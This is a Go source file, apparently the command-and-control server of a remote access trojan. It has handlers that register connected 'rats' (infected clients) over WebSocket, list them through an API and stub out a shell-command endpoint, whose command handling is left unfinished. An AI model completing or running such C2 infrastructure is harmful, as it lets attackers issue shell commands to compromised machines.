package handlers

import (
	"argus/backend/models"
	"encoding/json"
	"log"
	"net/http"
	"path/filepath"
	"strings"
	"sync"

	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	ReadBufferSize:  1024,
	WriteBufferSize: 1024,
	CheckOrigin: func(r *http.Request) bool {
		return true // Allow all origins for testing; restrict in production
	},
}

// Global rat store
var (
	rats     = make(map[string]*models.Rat)
	ratsLock sync.RWMutex
)

// ServeFrontend serves the Svelte index.html for all routes
func ServeFrontend(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, filepath.Join("backend", "static", "index.html"))
}

// GetRats returns the list of connected rats
func GetRats(w http.ResponseWriter, r *http.Request) {
	ratsLock.RLock()
	defer ratsLock.RUnlock()

	data, err := json.Marshal(rats)
	if err != nil {
		http.Error(w, "Failed to serialize rats", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	w.Write(data)
}

// WebSocketHandler handles WebSocket connections from rats
func WebSocketHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("WebSocket upgrade failed:", err)
		return
	}
	defer conn.Close()

	// Read initial rat data
	var initData models.Rat
	if err := conn.ReadJSON(&initData); err != nil {
		log.Println("Failed to read initial data:", err)
		return
	}

	// Assign unique ID if not provided
	if initData.ID == "" {
		log.Println("Rat ID missing")
		return
	}

	// Store rat data
	ratsLock.Lock()
	rats[initData.ID] = &initData
	rats[initData.ID].Conn = conn
	ratsLock.Unlock()

	log.Printf("Rat connected: %s (%s)", initData.Name, initData.ID)

	// Handle WebSocket messages
	for {
		var msg models.Message
		if err := conn.ReadJSON(&msg); err != nil {
			log.Println("WebSocket read error:", err)
			ratsLock.Lock()
			delete(rats, initData.ID)
			ratsLock.Unlock()
			return
		}

		// Handle message types
		switch msg.Type {
		case "shell_output":
			//Add later
		}
	}
}

// ShellCommandHandler handles shell commands and path requests
func ShellCommandHandler(w http.ResponseWriter, r *http.Request) {
	id := strings.TrimPrefix(r.URL.Path, "/api/shell/")
	if id == "" {
		http.Error(w, "Rat ID required", http.StatusBadRequest)
		return
	}
	// Add more later
}
